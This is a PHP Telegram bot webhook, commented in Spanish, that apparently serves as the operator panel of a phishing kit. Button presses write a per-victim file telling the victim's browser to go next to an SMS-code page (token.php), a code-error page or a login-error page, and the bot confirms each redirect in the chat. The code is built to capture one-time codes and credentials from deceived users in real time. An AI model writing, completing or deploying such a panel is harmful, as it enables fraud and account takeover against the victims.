<?php
// Habilitar reporte de errores
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Obtener los datos de entrada
$content = file_get_contents("php://input");

// Registrar la entrada para depuración
file_put_contents('debug.log', date('Y-m-d H:i:s') . ' - Input: ' . $content . "\n", FILE_APPEND);

// Decodificar el JSON
$update = json_decode($content, true);

// Verificar si hay un error al decodificar el JSON
if (json_last_error() !== JSON_ERROR_NONE) {
    file_put_contents('error.log', date('Y-m-d H:i:s') . ' - Error al decodificar JSON: ' . json_last_error_msg() . "\n", FILE_APPEND);
    die('Error al procesar la solicitud');
}

// Incluir configuración
require_once("settings.php");

// Obtener el chat_id del mensaje o callback
$chat_id = $update["message"]["chat"]["id"] ?? ($update["callback_query"]["from"]["id"] ?? null);

// Función para enviar mensajes al chat
function sendMessage($chat_id, $text, $token) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $params = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    // Registrar la respuesta para depuración
    file_put_contents('debug.log', date('Y-m-d H:i:s') . ' - Response: ' . $response . "\n", FILE_APPEND);
    
    if ($httpcode != 200) {
        file_put_contents('error.log', date('Y-m-d H:i:s') . ' - Error al enviar mensaje: ' . $response . "\n", FILE_APPEND);
        return false;
    }
    
    return true;
}

// Procesar el mensaje
if (isset($update["callback_query"])) {
    try {
        $data = $update["callback_query"]["data"];
        $parts = explode("|", $data);
        
        if (count($parts) < 2) {
            throw new Exception("Formato de callback_data inválido");
        }
        
        list($accion, $usuario) = $parts;
        $usuario = preg_replace('/[^a-zA-Z0-9_]/', '', $usuario); // Limpiar el nombre de usuario
        
        // Verificar si el directorio de acciones existe, si no, crearlo
        if (!is_dir('acciones')) {
            mkdir('acciones', 0755, true);
        }
        
        $mensaje = "";
        $archivo = "";
        
        switch ($accion) {
            case "TOKEN":
                $archivo = "token.php";
                $mensaje = "➡️ Redirigido a SMS para $usuario";
                break;
                
            case "TOKEN-ERROR":
                $archivo = "tokenerror.php";
                $mensaje = "❌ Redirigido a SMSERROR para $usuario";
                break;
                
            case "LOGIN-ERROR":
                $archivo = "loginerror.php";
                $mensaje = "⚠️ Redirigido a LOGINERROR para $usuario";
                break;
                
            default:
                throw new Exception("Acción no reconocida: $accion");
        }
        
        // Guardar la acción
        if (file_put_contents("acciones/{$usuario}.txt", $archivo) === false) {
            throw new Exception("No se pudo guardar la acción para $usuario");
        }
        
        // Enviar confirmación
        if (!sendMessage($chat_id, $mensaje, $token)) {
            throw new Exception("Error al enviar mensaje de confirmación");
        }
        
    } catch (Exception $e) {
        file_put_contents('error.log', date('Y-m-d H:i:s') . ' - Error: ' . $e->getMessage() . "\n", FILE_APPEND);
        sendMessage($chat_id, "❌ Error al procesar la solicitud: " . $e->getMessage(), $token);
    }
}

// Responder a Telegram para evitar timeouts
header("Content-Type: application/json");
echo json_encode(["status" => "ok"]);
?>
